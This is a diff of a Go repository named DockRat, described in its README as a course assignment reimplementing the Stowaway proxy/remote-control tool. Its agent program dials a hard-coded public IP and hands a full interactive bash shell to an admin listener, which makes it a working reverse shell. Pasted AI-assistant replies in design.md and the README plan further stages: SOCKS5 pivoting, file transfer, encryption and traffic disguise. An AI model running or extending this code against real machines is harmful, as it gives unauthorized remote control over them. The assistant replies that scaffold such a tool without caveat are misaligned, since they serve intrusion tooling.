@@ -1,0 +1,1142 @@
+子文件夹：./cmd
+子文件夹：./cmd/admin
+文件：./cmd/admin/main.go
+内容：
+// === /cmd/admin/main.go ===
+// === file info ===
+// admin 行为：
+// 输入每条命令（如 cd /tmp、ls）
+
+// 编码为结构化协议 {"type": "exec", "data": "cd /tmp"}
+
+// 等待结果返回后显示
+
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"io"
+	"net"
+	"os"
+
+	"github.com/Singert/DockRat/core/protocol"
+)
+
+// func main() {
+// 	ln, err := net.Listen("tcp", ":9999")
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	fmt.Println("[*] Waiting for agent to connect...")
+// 	conn, err := ln.Accept()
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	defer conn.Close()
+// 	fmt.Println("[*] Agent connected.")
+
+// 	// goroutine 接收返回结果
+// 	go func() {
+// 		scanner := bufio.NewScanner(conn)
+// 		for scanner.Scan() {
+// 			var msg protocol.Message
+// 			if err := json.Unmarshal(scanner.Bytes(), &msg); err == nil && msg.Type == "result" {
+// 				fmt.Print(msg.Data)
+// 			}
+// 		}
+// 	}()
+
+// 	stdin := bufio.NewScanner(os.Stdin)
+// 	fmt.Println("[*] Enter 'exit' to quit.")
+// 	for {
+// 		fmt.Print("Admin> ")
+// 		if !stdin.Scan() {
+// 			break
+// 		}
+// 		cmd := stdin.Text()
+// 		if cmd == "exit" {
+// 			data, _ := protocol.Encode(protocol.Message{Type: "exit", Data: ""})
+// 			conn.Write(append(data, '\n'))
+// 			break
+// 		}
+// 		msg := protocol.Message{Type: "exec", Data: cmd}
+// 		data, _ := protocol.Encode(msg)
+// 		conn.Write(append(data, '\n'))
+// 	}
+// }
+
+// func main() {
+// 	ln, err := net.Listen("tcp", ":9999")
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	fmt.Println("[*] Waiting for agent to connect...")
+
+// 	conn, err := ln.Accept()
+// 	if err != nil {
+// 		panic(err)
+// 	}
+// 	defer conn.Close()
+// 	fmt.Println("[*] Agent connected.")
+// 	fmt.Println("[*] Enter 'shell' to start interactive session.")
+
+// 	stdin := bufio.NewScanner(os.Stdin)
+// 	for {
+// 		fmt.Print("Admin> ")
+// 		if !stdin.Scan() {
+// 			break
+// 		}
+// 		line := stdin.Text()
+// 		if line == "shell" {
+// 			msg := protocol.Message{Type: "cmd", Data: ""}
+// 			data, _ := protocol.Encode(msg)
+// 			conn.Write(append(data, '\n'))
+
+// 			fmt.Println("[*] Switched to interactive shell. Press Ctrl+C to exit.")
+
+// 			// 🔄 新增双向异步交互
+// 			done := make(chan struct{})
+
+// 			// 输入流：admin → agent shell
+// 			go func() {
+// 				_, _ = io.Copy(conn, os.Stdin)
+// 				done <- struct{}{}
+// 			}()
+
+// 			// 输出流：agent shell → admin
+// 			go func() {
+// 				_, _ = io.Copy(os.Stdout, conn)
+// 				done <- struct{}{}
+// 			}()
+
+// 			<-done // 任一方向断开就退出
+// 			break
+// 		}
+// 	}
+// }
+
+func main() {
+	ln, err := net.Listen("tcp", ":9999")
+	if err != nil {
+		panic(err)
+	}
+	fmt.Println("[*] Waiting for agent to connect...")
+
+	conn, err := ln.Accept()
+	if err != nil {
+		panic(err)
+	}
+	defer conn.Close()
+	fmt.Println("[*] Agent connected.")
+	fmt.Println("[*] Enter 'shell' to start interactive session.")
+
+	stdin := bufio.NewScanner(os.Stdin)
+	for {
+		fmt.Print("Admin> ")
+		if !stdin.Scan() {
+			break
+		}
+		line := stdin.Text()
+		if line == "shell" {
+			// 发送进入 shell 模式的请求
+			msg := protocol.NewCommand("")
+			data, _ := protocol.EncodeWithNewline(msg)
+			conn.Write(data)
+
+			fmt.Println("[*] Switched to interactive shell. Press Ctrl+C or 'exit' to quit.")
+			startInteractiveShell(conn)
+			break
+		}
+	}
+}
+
+// ✅ 新增函数：使用 pty 模拟 admin 本地终端，连接远程 shell
+func startInteractiveShell(conn net.Conn) {
+	fmt.Fprintln(os.Stderr, "[*] Shell session started. Press Ctrl+C to exit.")
+
+	// 双向桥接 conn <=> admin 的控制台
+	done := make(chan struct{})
+
+	// 用户输入 -> 发送给 agent shell
+	go func() {
+		_, _ = io.Copy(conn, os.Stdin)
+		done <- struct{}{}
+	}()
+
+	// agent shell 输出 -> 显示在 admin 控制台
+	go func() {
+		_, _ = io.Copy(os.Stdout, conn)
+		done <- struct{}{}
+	}()
+
+	<-done // 任一方向断开则退出
+}
+
+子文件夹：./cmd/agent
+文件：./cmd/agent/main.go
+内容：
+// === /cmd/agent/main.go ===
+// === file info ===
+// agent 行为：
+// 启动时运行一个 bash 或 cmd.exe
+
+// 通过 cmd.StdinPipe() 和 cmd.StdoutPipe() 与之交互
+
+// 将每条 admin 发来的命令写入 shell 的标准输入
+
+// 将结果（stdout/stderr）返回给 admin
+package main
+
+import (
+	"bufio"
+	"fmt"
+	"net"
+
+	"github.com/Singert/DockRat/core/protocol"
+	"github.com/Singert/DockRat/core/shell"
+)
+
+// func main() {
+// 	conn, err := net.Dial("tcp", "127.0.0.1:9999")
+// 	if err != nil {
+// 		fmt.Println("Connect error:", err)
+// 		return
+// 	}
+// 	defer conn.Close()
+
+// 	session, err := shell.StartSession("bash") // or cmd.exe on Windows
+// 	if err != nil {
+// 		fmt.Println("Shell start error:", err)
+// 		return
+// 	}
+
+// 	dispatcher := protocol.NewDispatcher()
+
+// 	dispatcher.Register("exec", func(msg protocol.Message) error {
+// 		output, err := session.Exec(msg.Data)
+// 		if err != nil {
+// 			output = "[ERROR] " + err.Error()
+// 		}
+// 		resp, _ := protocol.Encode(protocol.Message{
+// 			Type: "result",
+// 			Data: output,
+// 		})
+// 		conn.Write(append(resp, '\n'))
+// 		return nil
+// 	})
+
+// 	dispatcher.Register("exit", func(msg protocol.Message) error {
+// 		conn.Close()
+// 		os.Exit(0)
+// 		return nil
+// 	})
+
+// 	fmt.Println("[*] Agent ready.")
+// 	_ = dispatcher.Listen(conn)
+// }
+
+//TODO:🚀 下一步推荐
+// 你现在已经完成：
+
+// 持久连接
+
+// 协议调度
+
+// 协议驱动的行为（shell/exit）
+
+// ✅ 接下来你可以考虑：
+
+// 增加 node ID 结构，支持 use/select 控制多个节点
+
+// 添加 forward/backward 转发命令支持
+
+// 建立 topo 结构，维护多级拓扑
+
+// 是否需要我继续为你添加 节点结构 和 多级转发 的逻辑基础？
+
+func main() {
+	conn, err := net.Dial("tcp", "45.89.233.225:9999")
+	if err != nil {
+		panic(err)
+	}
+	defer conn.Close()
+	fmt.Println("[*] Connected to admin.")
+
+	scanner := bufio.NewScanner(conn)
+	for scanner.Scan() {
+		msg, err := protocol.Decode(scanner.Bytes())
+		if err != nil {
+			continue
+		}
+		if msg.Type == "cmd" {
+			fmt.Println("[*] Launching interactive shell...")
+			_ = shell.StartShellIO(conn, "bash")
+			break
+		}
+	}
+}
+
+文件：./cmd/design.md
+内容：
+好问题。我们来**精确区分**这两种方式对“持久化 shell session”的支持情况。
+
+---
+
+## ✅ 你现在有两种远程 shell 模式：
+
+| 模式类型                     | 描述                                | 是否持久化 | 用途                      |
+| ------------------------ | --------------------------------- | ----- | ----------------------- |
+| **结构化交互 (`exec`)**       | 后台维护一个 shell 实例，每条命令发送后执行         | ✅ 是   | 自动化、一次一条命令、后台执行         |
+| **完整 pty shell (`cmd`)** | 启动一个 bash，开启 pty 终端双向流 io.Copy 模式 | ✅ 是   | 模拟 ssh，手动交互、cd、历史、提示符保留 |
+
+---
+
+## ✅ 所以答案是：**是的，仍然持久化，而且更真实**
+
+你调用的是：
+
+```go
+cmd := exec.Command("bash")
+ptmx, _ := pty.Start(cmd)
+```
+
+只要：
+
+* 这个 `cmd` 没有退出
+* 你没关闭 `ptmx`
+
+它就**持续存在**，你在其中执行的 `cd`、`export`、`alias`、函数定义等都 **保留上下文**。
+
+---
+
+## ✅ 举例证明：
+
+```bash
+Admin> shell
+$ cd /tmp
+$ touch x
+$ ls
+x
+$ export TEST=123
+$ echo $TEST
+123
+```
+
+你退出 shell（`exit`）才会关闭它。
+
+---
+
+## 🧠 总结：
+
+| 特性               | `exec` 模式 | `shell` 模式（pty） |
+| ---------------- | --------- | --------------- |
+| 持久上下文（cd/export） | ✅ 是       | ✅ 是             |
+| 输出结构化            | ✅ 是       | ❌（原始终端流）        |
+| 可脚本化             | ✅ 适合      | ❌ 不适合           |
+| 模拟终端             | ❌ 否       | ✅ 完整 bash       |
+| 保留提示符/补全         | ❌ 否       | ✅ 有 bash 行为     |
+
+---
+
+你完全可以双模共存：
+
+* 自动命令：用 `exec`
+* 手动控制：用 `shell`
+
+---
+
+需要我为你建立一个状态机，支持多节点间切换 shell 会话（如 Metasploit 的 `sessions -i 1`）吗？或者现在加上 `upload`？
+
+文件：./cmd/main.go
+内容：
+// cmd/main.go
+package main
+
+// import (
+// 	"fmt"
+// 	"net"
+// 	"os"
+
+// 	"github.com/Singert/DockRat/core/node"
+// 	"github.com/Singert/DockRat/core/protocol"
+// )
+
+// func main() {
+// 	if len(os.Args) < 2 {
+// 		fmt.Println(fmt.Println("Usage: stowaway <admin|agent>"))
+// 		return
+// 	}
+// 	role := os.Args[1]
+
+// 	switch role {
+// 	case "admin":
+// 		startAdmin()
+// 	case "agent":
+// 		startAgent()
+// 	default:
+// 		fmt.Println("unknown role")
+// 	}
+// }
+
+// func startAdmin() {
+// 	fmt.Println("Starting Admin")
+
+// 	ln, err := net.Listen("tcp", ":9999")
+// 	if err != nil {
+// 		fmt.Println("error listening:", err)
+// 		return
+// 	}
+// 	fmt.Println("admin is listening on")
+// 	nodeManager := node.NewNoddManager()
+// 	for {
+// 		conn, err := ln.Accept()
+// 		if err != nil {
+// 			fmt.Println("error accept connection: ", err)
+// 			continue
+// 		}
+// 		nodeID := nodeManager.AddNode(conn)
+// 		fmt.Println("New agent connected with ID:", nodeID)
+// 		go protocol.HandleConn(conn, true, nodeID)
+// 	}
+
+// }
+
+// func startAgent() {
+// 	conn, err := net.Dial("tcp", "127.0.0.1:9999")
+// 	if err != nil {
+// 		fmt.Println("error connecting to admin:", err)
+// 		return
+// 	}
+// 	fmt.Println("Connected to admin")
+// 	protocol.HandleConn(conn, false, -1)
+// }
+
+子文件夹：./core
+子文件夹：./core/crypto
+子文件夹：./core/filetransfer
+子文件夹：./core/node
+文件：./core/node/node.go
+内容：
+// core/node/manager.go
+// Package node provides the NodeManager struct and its methods for managing nodes.
+
+package node
+
+import (
+	"net"
+	"sync"
+)
+
+type NodeManager struct {
+	mu    sync.Mutex
+	nodes map[int]net.Conn
+	next  int
+}
+
+func NewNoddManager() *NodeManager {
+	return &NodeManager{
+		nodes: make(map[int]net.Conn),
+		next:  0,
+	}
+}
+
+func (nm *NodeManager) AddNode(conn net.Conn) int {
+	nm.mu.Lock()
+	defer nm.mu.Unlock()
+
+	nodeID := nm.next
+	nm.nodes[nodeID] = conn
+	nm.next++
+
+	return nodeID
+}
+
+func (nm *NodeManager) Get(nodeID int) (net.Conn, bool) {
+	nm.mu.Lock()
+	defer nm.mu.Unlock()
+
+	conn, ok := nm.nodes[nodeID]
+	return conn, ok
+}
+
+func (nm *NodeManager) Remove(nodeID int) {
+	nm.mu.Lock()
+	defer nm.mu.Unlock()
+	delete(nm.nodes, nodeID)
+}
+
+子文件夹：./core/protocol
+文件：./core/protocol/dispatcher.go
+内容：
+// === core/protocol/protocol.go ===
+
+package protocol
+
+import (
+	"bufio"
+	"fmt"
+	"net"
+	"strings"
+)
+
+type HandlerFunc func(msg Message) error
+
+type Dispatcher struct {
+	handlers map[string]HandlerFunc
+}
+
+func NewDispatcher() *Dispatcher {
+	return &Dispatcher{
+		handlers: make(map[string]HandlerFunc),
+	}
+}
+
+func (d *Dispatcher) Register(msgType string, handler HandlerFunc) {
+	d.handlers[msgType] = handler
+}
+
+func (d *Dispatcher) Dispatch(msg Message) error {
+	h, ok := d.handlers[msg.Type]
+	if !ok {
+		return fmt.Errorf("unhandled message type: %s", msg.Type)
+	}
+	return h(msg)
+}
+
+func (d *Dispatcher) Listen(conn net.Conn) error {
+	scanner := bufio.NewScanner(conn)
+	for scanner.Scan() {
+		line := scanner.Text()
+		if strings.TrimSpace(line) == "" {
+			continue
+		}
+		msg, err := Decode([]byte(line))
+		if err != nil {
+			return fmt.Errorf("error decoding message: %v", err)
+		}
+		if err := d.Dispatch(msg); err != nil {
+			return fmt.Errorf("error dispatching message: %v", err)
+		}
+	}
+	return scanner.Err()
+}
+
+func (d *Dispatcher) ListenOnce(conn net.Conn) error {
+	scanner := bufio.NewScanner(conn)
+	if scanner.Scan() {
+		msg, err := Decode(scanner.Bytes())
+		fmt.Printf("[*] Received message:%+v\n", msg)
+		if err != nil {
+			return err
+		}
+		if handler, ok := d.handlers[msg.Type]; ok {
+			return handler(msg)
+		}
+		return fmt.Errorf("unhandled message type: %s", msg.Type)
+	}
+	return scanner.Err()
+}
+
+文件：./core/protocol/protocol.go
+内容：
+// === core/protocol/protocol.go ===
+package protocol
+
+import "encoding/json"
+
+// func HandleConn(conn net.Conn, isAdmin bool, nodeID int) {
+// 	defer conn.Close()
+
+// 	if isAdmin {
+// 		handleAdmin(conn, nodeID)
+// 	} else {
+// 		handleAgent(conn)
+// 	}
+// }
+
+// func handleAdmin(conn net.Conn, nodeID int) {
+// 	scanner := bufio.NewScanner(os.Stdin)
+// 	writer := bufio.NewWriter(conn)
+// 	r := bufio.NewReader(conn)
+// 	fmt.Print("Shell> ")
+// 	for scanner.Scan() {
+// 		line := scanner.Text()
+// 		writer.WriteString(line + "\n")
+// 		writer.Flush()
+// 		fmt.Printf("[node %d] shell", nodeID)
+// 		for {
+// 			response, err := r.ReadString('\n')
+// 			if err != nil {
+// 				fmt.Println("error reading from agent:", err)
+// 				break
+// 			}
+// 			if response == "__END__\n" {
+// 				break
+// 			}
+// 			fmt.Print(response)
+// 		}
+
+// 		fmt.Print("[Node %d]Shell> ")
+// 	}
+// }
+
+// func handleAgent(conn net.Conn) {
+// 	sacnner := bufio.NewScanner(conn)
+// 	writer := bufio.NewWriter(conn)
+// 	for sacnner.Scan() {
+// 		line := sacnner.Text()
+// 		output := shell.ExecCommand(line)
+// 		writer.WriteString(output)
+// 		writer.WriteString("\n__END__\n")
+// 		writer.Flush()
+// 	}
+// }
+
+type Message struct {
+	Type string `json:"type"` //"cmd | exit"
+	Data string `json:"data"`
+}
+
+func Encode(msg Message) ([]byte, error) {
+	return json.Marshal(msg)
+}
+
+func EncodeWithNewline(msg Message) ([]byte, error) {
+	data, err := Encode(msg)
+	if err != nil {
+		return nil, err
+	}
+	return append(data, '\n'), nil
+}
+
+func Decode(data []byte) (Message, error) {
+	var msg Message
+	err := json.Unmarshal(data, &msg)
+	return msg, err
+}
+
+func NewCommand(cmd string) Message {
+	return Message{
+		Type: "cmd",
+		Data: cmd,
+	}
+}
+func NewExit() Message {
+	return Message{
+		Type: "exit",
+	}
+}
+
+子文件夹：./core/shell
+文件：./core/shell/interactive.go
+内容：
+// === /core/shell/interactive.go ===
+package shell
+
+import (
+	"fmt"
+	"io"
+	"os"
+	"os/exec"
+
+	"github.com/creack/pty"
+)
+
+func StartShellIO(conn io.ReadWriter, shell string) error {
+	cmd := exec.Command("bash", "-i")
+	cmd.Env = append(os.Environ(), "TERM=xterm-256color")
+	// ✅ 设置初始窗口大小：常规 80x24
+	ptmx, err := pty.StartWithSize(cmd, &pty.Winsize{
+		Rows: 24,
+		Cols: 80,
+	})
+	if err != nil {
+		return err
+	}
+	defer func() {
+		_ = ptmx.Close()
+		_ = cmd.Process.Kill()
+	}()
+
+	fmt.Fprintln(os.Stderr, "[*] Shell session started.")
+	go io.Copy(ptmx, conn)     // admin -> shell
+	_, _ = io.Copy(conn, ptmx) // shell -> admin
+	return nil
+}
+
+// func handleInteractive(conn net.Conn) {
+// 	fmt.Println("[*] Switched to interactive shell. Press Ctrl+C to exit.")
+
+// 	done := make(chan struct{})
+
+// 	// admin -> agent (stdin -> conn)
+// 	go func() {
+// 		_, _ = io.Copy(conn, os.Stdin)
+// 		done <- struct{}{}
+// 	}()
+
+// 	// agent -> admin (conn -> stdout)
+// 	go func() {
+// 		_, _ = io.Copy(os.Stdout, conn)
+// 		done <- struct{}{}
+// 	}()
+
+// 	<-done // wait for either direction to close
+// }
+
+文件：./core/shell/shell.go
+内容：
+// core/shell/shell.go
+package shell
+
+import (
+	"bufio"
+	"bytes"
+	"fmt"
+	"os"
+	"os/exec"
+	"strings"
+	"sync"
+	"syscall"
+
+	"github.com/creack/pty"
+)
+
+type ShellSession struct {
+	cmd    *exec.Cmd
+	ptmx   *os.File
+	reader *bufio.Reader
+	mu     sync.Mutex
+	shell  string
+}
+
+// StartSession 启动一个新的 shell 会话
+func StartSession(shell string) (*ShellSession, error) {
+	session := &ShellSession{shell: shell}
+	err := session.spawn()
+	if err != nil {
+		return nil, err
+	}
+	return session, nil
+}
+
+// spawn 用于初始化/重启 shell
+func (s *ShellSession) spawn() error {
+	cmd := exec.Command(s.shell)
+	ptmx, err := pty.Start(cmd)
+	if err != nil {
+		return err
+	}
+	s.cmd = cmd
+	s.ptmx = ptmx
+	s.reader = bufio.NewReader(ptmx)
+	return nil
+}
+
+// Exec 向 shell 发送命令，并读取直到特殊行
+func (s *ShellSession) Exec(command string) (string, error) {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	if !s.IsAlive() {
+		return "", fmt.Errorf("shell is not running")
+	}
+
+	tag := "###END###"
+	fullCmd := fmt.Sprintf("%s\necho %s\n", command, tag)
+	if _, err := s.ptmx.Write([]byte(fullCmd)); err != nil {
+		return "", err
+	}
+
+	var buf bytes.Buffer
+	for {
+		line, err := s.reader.ReadString('\n')
+		if err != nil {
+			break
+		}
+		if strings.Contains(line, tag) {
+			break
+		}
+		buf.WriteString(line)
+	}
+	return buf.String(), nil
+}
+
+// Kill 优雅关闭 shell
+func (s *ShellSession) Kill() error {
+	s.mu.Lock()
+	defer s.mu.Unlock()
+
+	if s.ptmx != nil {
+		_ = s.ptmx.Close()
+	}
+	if s.cmd != nil && s.cmd.Process != nil {
+		return s.cmd.Process.Kill()
+	}
+	return nil
+}
+
+// IsAlive 判断 shell 是否仍在运行
+func (s *ShellSession) IsAlive() bool {
+	if s.cmd == nil || s.cmd.Process == nil {
+		return false
+	}
+	// 调用系统 syscall 检查进程是否还活着
+	err := s.cmd.Process.Signal(syscall.Signal(0))
+	return err == nil
+}
+
+// Reset 重启 shell 会话
+func (s *ShellSession) Reset() error {
+	_ = s.Kill()
+	return s.spawn()
+}
+
+子文件夹：./core/transport
+子文件夹：./core/tunnel
+文件：./go.mod
+内容：
+module github.com/Singert/DockRat
+
+go 1.23.2
+
+require github.com/creack/pty v1.1.24
+
+文件：./go.sum
+内容：
+github.com/creack/pty v1.1.24 h1:bJrF4RRfyJnbTJqzRLHzcGaZK1NeM5kTC9jGgovnR1s=
+github.com/creack/pty v1.1.24/go.mod h1:08sCNb52WyoAwi2QDyzUCTgcvVFhUzewun7wtTfvcwE=
+
+文件：./LICENSE
+内容：
+MIT License
+
+Copyright (c) 2025 Singert
+
+Permission is hereby granted, free of charge, to any person obtaining a copy
+of this software and associated documentation files (the "Software"), to deal
+in the Software without restriction, including without limitation the rights
+to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
+copies of the Software, and to permit persons to whom the Software is
+furnished to do so, subject to the following conditions:
+
+The above copyright notice and this permission notice shall be included in all
+copies or substantial portions of the Software.
+
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
+IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
+FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
+AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
+LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
+OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
+SOFTWARE.
+
+This project is a full re-implementation inspired by the original [Stowaway](https://github.com/ph4ntonn/Stowaway) project, which is licensed under the MIT License.
+
+子文件夹：./Makefile
+文件：./output.txt
+内容：
+
+子文件夹：./pkg
+文件：./README.md
+内容：
+# DockRat
+课程作业-对项目Stowaway的仿写
+复刻 **Stowaway** 项目涉及多个方面，包括多级网络通信、命令调度、节点管理、TLS/加密通信、文件传输等功能，整个体系设计复杂但逻辑清晰。以下是复刻该项目的整体技术路线和模块建议：
+
+---
+
+## 🧩 核心功能模块划分
+
+### 1. **基础通信层（Core Transport）**
+
+* 支持 TCP/HTTP/WebSocket 三种协议通信（裸TCP、HTTP消息封装、WebSocket长连接）
+* 支持主动连接（Client）和被动监听（Server）模式
+* 支持 Socks5/HTTP 代理穿透
+* 可选 TLS 加密（建议使用 `crypto/tls` 标准库）
+* 实现通信心跳机制，保持连接活性
+
+### 2. **加密模块（Crypto Layer）**
+
+* 使用对称加密（如 AES-256-GCM）加密节点间传输的数据流
+* 密钥交换基于预共享密钥（可选 Diffie-Hellman 改进）
+* TLS 和 AES 可独立控制（使用 TLS 时禁用 AES）
+
+### 3. **节点管理模块（Node Tree）**
+
+* 构造基于树的网络结构（每个节点有父节点和多个子节点）
+* 管理每个节点的状态（上线/掉线）、代理服务（socks/forward/backward）、备注等信息
+* 多节点间通过 ID 或编号识别，保持拓扑图实时更新
+
+### 4. **命令控制协议（Command Protocol）**
+
+* 定义统一的指令格式（JSON或自定义协议）
+* 典型指令：connect、listen、ssh、shell、forward、backward、upload、download、shutdown 等
+* 建议使用状态机来解析处理命令（支持 command dispatch）
+
+### 5. **管理端界面（Admin CLI）**
+
+* 设计一个交互式 CLI（带命令历史、补全、导航）
+* 状态展示如 `detail` / `topo`
+* 节点 `use` 后支持子命令（节点服务管理）
+
+### 6. **文件传输模块**
+
+* 自定义简易传输协议（头信息+长度+数据块）
+* 断点续传、上传下载文件，带进度显示
+
+### 7. **端口转发模块**
+
+* `forward`: Admin监听本地端口，将流量转发给远程节点的目标端口
+* `backward`: Agent监听本地端口，反向将流量转发回Admin端口
+* 支持多连接、连接管理
+
+### 8. **端口复用模块（高级功能）**
+
+* Linux：支持 `iptables` 重定向
+* Windows/Mac：使用 `SO_REUSEPORT` 和 `SO_REUSEADDR`
+* 提供脚本和 agent 配置交互，确保复用前后服务正常
+
+---
+
+## 🛠️ 技术选型建议（Go 实现）
+
+| 功能     | 推荐包/工具                                                         |
+| ------ | -------------------------------------------------------------- |
+| 网络通信   | `net`, `net/http`, `golang.org/x/net/websocket`                |
+| TLS 加密 | `crypto/tls`                                                   |
+| AES 加密 | `crypto/aes`, `crypto/cipher`                                  |
+| 命令行交互  | `github.com/c-bata/go-prompt`, `github.com/AlecAivazis/survey` |
+| 并发处理   | `goroutines`, `channels`, `sync.Map`                           |
+| 日志记录   | `log`, `github.com/sirupsen/logrus`                            |
+| 跨平台构建  | `Makefile`, `go build` with `GOOS` / `GOARCH`                  |
+| 多平台支持  | `build constraints`, 编译时用 `GOARCH=arm/mips` 等                  |
+| 文件传输   | 自定义流式协议或基于 `io.Copy` + `bufio`                                 |
+
+---
+
+## 🧱 项目结构建议
+
+```bash
+stowaway-clone/
+├── cmd/
+│   ├── stowaway_admin/
+│   └── stowaway_agent/
+├── core/
+│   ├── transport/         # 传输层（TCP/HTTP/WS）
+│   ├── crypto/            # 加密模块（AES/TLS）
+│   ├── node/              # 节点管理
+│   ├── protocol/          # 命令协议定义
+│   ├── filetransfer/      # 文件上传/下载
+│   ├── tunnel/            # forward/backward/ssh隧道
+├── pkg/
+│   └── utils/
+├── script/                # reuse.py、辅助脚本
+├── Makefile
+└── README.md
+```
+
+---
+
+## 📌 开发建议
+
+1. **优先实现最小可用原型**：
+
+   * Admin + 单个 Agent（TCP 通信，shell 功能）
+   * 再扩展：Socks5, 文件传输, TLS, 多级连接
+
+2. **使用 protobuf/json 定义消息结构体**，标准化传输内容
+
+3. **设置统一的日志调试开关**，便于排查节点间通信问题
+
+4. **复刻 listen/connect/sshtunnel 命令功能**时注意 CLI 状态管理（面板切换）
+
+5. **采用 interface 封装传输抽象层**，比如 `ConnWrapper`，适配 TCP/TLS/WS等不同类型连接
+
+---
+
+## ✅ 最终目标功能清单（对照原版）
+
+| 功能               | 实现建议                       |
+| ---------------- | -------------------------- |
+| 多级节点拓扑           | 树结构 + ID映射                 |
+| TCP/HTTP/WS流量支持  | 使用统一流量封装层                  |
+| TLS/AES-GCM加密    | `tls.Conn` / `cipher.AEAD` |
+| 远程 shell / ssh隧道 | `os/exec` + pty            |
+| 文件上传下载           | `io.Copy` 实现分块传输           |
+| socks5/http代理    | `golang.org/x/net/proxy`   |
+| 端口正向/反向映射        | 建立监听端口+多协程                 |
+| 跨平台编译支持          | `Makefile + go build`      |
+| CLI界面（带补全）       | `go-prompt`                |
+| 端口复用/IPTABLES整合  | 提供外部 Python 脚本辅助           |
+
+---
+
+如你希望我直接生成一个 **初始框架项目** 或提供部分代码模块（如 TLS 通信、节点管理、传输封装、shell 执行），我可以为你生成。你希望我先从哪个模块开始？
+
+当然可以，我们可以将**复刻 Stowaway 的开发过程分为五个阶段**，每个阶段都明确目标、重点模块和建议技术栈。你只需按部就班，一步步来，项目就能顺利推进。
+
+---
+
+## 🧭 阶段化开发路线
+
+### ✅ **阶段一：基础通信层与最小可用原型 (MVP)**
+
+> **目标**：实现 admin 与 agent 之间的 TCP 通信和命令交互，最简单的远程命令执行（shell）
+
+#### ✔ 你要实现的功能：
+
+* `admin`：监听端口，等待连接
+* `agent`：主动连接 admin
+* 双向 TCP 通信：基于自定义协议传输命令和结果
+* 执行远程命令（用 `bash -c`）并返回结果
+
+#### 📁 模块目录建议：
+
+```bash
+core/
+  ├── protocol/       # 协议定义（结构体 + 编码/解码）
+  ├── shell/          # 执行命令并返回输出
+cmd/
+  ├── stowaway_admin/
+  └── stowaway_agent/
+```
+
+#### 🧱 技术点建议：
+
+* `net.Conn` 基础通信（TCP）
+* `encoding/gob` 或 `encoding/json` 实现简单的消息结构封装
+* `bufio.Reader/Writer` 实现数据读写
+* `os/exec` 运行命令并收集输出
+
+---
+
+### ✅ **阶段二：多级节点与命令系统设计**
+
+> **目标**：agent 可以作为中转节点，连接新的 agent，形成**树形结构**
+
+#### ✔ 你要实现的功能：
+
+* 每个节点可以转发数据给它的父节点或子节点
+* `use` 命令切换控制的节点
+* `connect` 命令让一个节点连接另一个 agent
+
+#### 📁 新增模块：
+
+```bash
+core/
+  ├── node/           # 节点结构与树管理
+  ├── router/         # 节点路由与转发
+```
+
+#### 🧠 技术点：
+
+* 节点分配 ID，维护父子结构
+* 每个连接都要有 metadata：ID、父子关系、状态
+* 路由模块实现从 admin -> node1 -> node2 -> node3 的链式消息转发
+
+---
+
+### ✅ **阶段三：Socks5、Shell、File 等服务功能**
+
+> **目标**：实现 socks5 代理、远程 shell、上传下载等关键服务
+
+#### ✔ 你要实现的功能：
+
+* 远程命令执行交互模式
+* 文件上传/下载（可用分块流式传输）
+* 本地启动 socks5，转发给 agent 出口访问
+
+#### 🧠 技术点：
+
+* `socks5`: 用现成的 [xtaci/smux](https://github.com/xtaci/smux) 或自己实现简单版本
+* shell：利用 pty 提供交互式 shell
+* 文件：`io.Copy` + metadata 描述传输流
+
+---
+
+### ✅ **阶段四：加密与协议切换支持**
+
+> **目标**：通信支持 TLS、AES-GCM、HTTP/WS 模式切换
+
+#### ✔ 你要实现的功能：
+
+* TLS 握手（双向）
+* AES-GCM 加密解密
+* WS/HTTP 伪装为应用层流量（套在 TCP 上）
+
+#### 🧠 技术点：
+
+* TLS：`crypto/tls`
+* AES：`crypto/aes`, `crypto/cipher`
+* WebSocket：`golang.org/x/net/websocket` 或 `nhooyr.io/websocket`
+
+---
+
+### ✅ **阶段五：CLI交互界面与完整控制面板**
+
+> **目标**：实现 admin 的完整命令行操作界面（支持补全、历史记录）
+
+#### ✔ 你要实现的功能：
+
+* 命令面板 (`help`, `use`, `listen`, `ssh`, `connect`, `upload`, `forward`, …)
+* 面板切换（admin主界面 <=> node控制面板）
+* 状态跟踪、进度条显示、错误反馈
+
+#### 推荐使用的库：
+
+* [c-bata/go-prompt](https://github.com/c-bata/go-prompt)：提供高级命令行交互
+* 或者自己实现：用 `bufio.Scanner` 处理命令输入 + 手动 dispatch 命令
+
+---
+
+## 🔨 建议你先做的第一步（立即可做）
+
+创建最小可用原型，实现最简单的 admin/agent TCP 通信 + 远程执行命令：
+
+```
+admin: ./stowaway_admin -l 9999
+agent: ./stowaway_agent -c 127.0.0.1:9999
+```
+
+1. 我可以直接给你写出这个部分的完整代码结构
+2. 然后你就可以在终端里看到：admin 发一条命令，agent 执行后返回结果 ✅
+
+---
+
+是否现在就从「**阶段一：admin 和 agent 的远程命令执行**」这个最小原型开始？我可以立刻给你生成对应的代码框架。你希望先实现哪种：命令单发返回，还是持续交互式 shell？
+
+子文件夹：./script
+文件：./test.go
+内容：
+package main
+
+import (
+	"fmt"
+	"io"
+	"os"
+	"os/exec"
+
+	"github.com/creack/pty"
+)
+
+func main() {
+	cmd := exec.Command("bash", "-i")
+	cmd.Env = append(os.Environ(), "TERM=xterm-256color")
+
+	ptmx, err := pty.Start(cmd)
+	if err != nil {
+		panic(err)
+	}
+	defer func() {
+		_ = ptmx.Close()
+		_ = cmd.Process.Kill()
+	}()
+
+	fmt.Fprintln(os.Stderr, "[*] Shell session started.")
+	go io.Copy(ptmx, os.Stdin)
+	io.Copy(os.Stdout, ptmx)
+}
+
+
